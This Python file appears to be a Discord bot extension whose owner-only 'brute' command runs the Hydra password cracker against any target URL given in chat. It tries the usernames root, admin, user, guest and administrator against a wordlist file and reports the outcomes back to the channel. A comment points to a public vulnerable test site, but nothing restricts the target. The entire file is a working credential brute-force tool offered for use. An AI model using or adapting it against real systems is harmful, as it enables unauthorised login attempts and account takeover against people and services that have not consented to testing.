import subprocess
import asyncio
import logging
from discord.ext import commands

logger = logging.getLogger(__name__)

class Brute(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def run_hydra(self, usernames, password_file, target_url):
        results = []
        for username in usernames:
            command = [
                'hydra',
                '-l', username,
                '-P', password_file,
                target_url
            ]
            try:
                result = subprocess.run(command, capture_output=True, text=True, timeout=10)
                if "1 valid password found" in result.stdout:
                    results.append(f"Success: {username} - {password_file}")
                else:
                    results.append(f"Failed: {username} - {password_file}")
            except subprocess.TimeoutExpired:
                results.append(f"Timeout: {username} - {password_file}")
            await asyncio.sleep(1)
        return results

    # http://testphp.vulnweb.com/login.php
    @commands.command(name="brute", help="Brute force an IP using Hydra.")
    @commands.is_owner()
    async def brute(self, ctx, target_url: str):
        try:
            usernames = ['root', 'admin', 'user', 'guest', 'administrator']
            password_file = 'utility/wordlist.txt'

            results = await self.run_hydra(usernames, password_file, target_url)
            await ctx.send(f"Results:\n{'\n'.join(results)}")
        except Exception as e:
            logger.error(f"An error occurred while executing brute: {e}", exc_info=True)
            await ctx.send("An error occurred while executing brute. Please try again later.")

async def setup(bot):
    await bot.add_cog(Brute(bot))